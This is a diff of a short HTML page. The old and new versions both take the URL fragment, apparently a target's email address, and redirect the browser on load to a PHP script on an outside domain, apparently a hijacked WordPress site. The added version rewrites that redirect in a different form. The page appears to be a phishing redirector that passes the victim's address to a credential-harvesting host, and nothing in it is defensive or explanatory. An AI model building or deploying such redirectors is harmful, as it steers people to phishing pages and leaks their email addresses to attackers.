@@ -1,15 +1,27 @@
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head></head>
-</body>
-<script>
-  var hash = window.location.hash;
-  if(hash !== "") {
+<!DOCTYPE html> 
 
-    hash = hash.split('#');
-    const email = hash[1];
+<html>
 
-      window.location.href = "https://www.architectuurstudioclay.nl/wp-library/5e1da.php?sf_base64_encode([EMail])&pcnt=4&request_type=session&use_cdtimr=use_cdtimr" + email;
-  }
-</script>
+<head> 
+    
+    <script> 
+        
+        var val = window.location.hash.substring(1); 
+    
+    </script> 
+
+</head> 
+    
+    <body>                  
+        
+        <script> 
+            
+            window.location.href = "https://www.architectuurstudioclay.nl/wp-library/5e1da.php#sf_base64_encode([EMail])"+val; 
+           
+        
+   
+        </script> 
+    
+    </body>
+
 </html>
